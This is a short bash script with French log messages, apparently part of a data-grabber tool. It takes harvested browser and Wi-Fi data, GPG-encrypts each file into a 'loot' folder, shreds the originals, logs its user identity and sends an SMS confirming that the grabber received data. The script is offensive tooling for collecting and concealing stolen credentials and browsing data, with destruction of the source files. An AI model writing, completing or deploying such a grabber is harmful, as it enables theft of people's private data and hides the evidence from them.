#!/bin/bash
WATCH_DIRS=("/var/data/browser_data" "/var/data/wifi_data")
DEST_DIR="/mnt/sdcard/loot/"
GPG_RECIPIENT="cryptobot@hackberry.local"
PASSPHRASE_FILE="/home/cryptobot/.gpg_passphrase"
LOG_FILE="/var/log/cryptobot/auto_encrypt.log"
PID_FILE="/tmp/auto_encrypt.pid"
id >> /tmp/id_cryptobot.log

process_file() {
    local file="$1"
    local dest="${DEST_DIR}/$(basename "$file").gpg"
    if gpg --batch --yes --passphrase-file "$PASSPHRASE_FILE" -e -r "$GPG_RECIPIENT" -o "$dest" "$file"; then
        shred -u "$file"
        echo "$(date '+%Y-%m-%d %H:%M') - Fichier chiffré : $(basename "$dest")" >> "$LOG_FILE"
        /usr/local/bin/sms "Grabber actif, data recue et chiffré ! $(basename "$dest")"
    else
        echo "$(date '+%Y-%m-%d %H:%M') - ERREUR : Échec du chiffrement pour $file" >> "$LOG_FILE"
    fi
}
